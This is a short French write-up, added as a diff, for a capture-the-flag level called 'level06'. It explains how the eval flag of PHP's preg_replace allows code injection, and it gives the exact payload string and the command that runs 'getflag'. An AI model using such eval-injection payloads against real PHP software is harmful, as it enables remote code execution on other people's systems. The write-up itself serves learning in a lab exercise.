@@ -1,0 +1,5 @@
+On voit qu'il y a le flag d'eval sur le preg_replace.
+Sur la doc de php sur le PCRE, on voit {${eval($_GET[php_code])}} qui permet d'injecter un eval
+on voit la declaration d'une variable en parametre ($z)
+on met ([x {${eval($z)}}]) dans /tmp/kek puis ./level06 /tmp/kek "echo exec(\"getflag\")"
+Awesome ! ~:hap:~
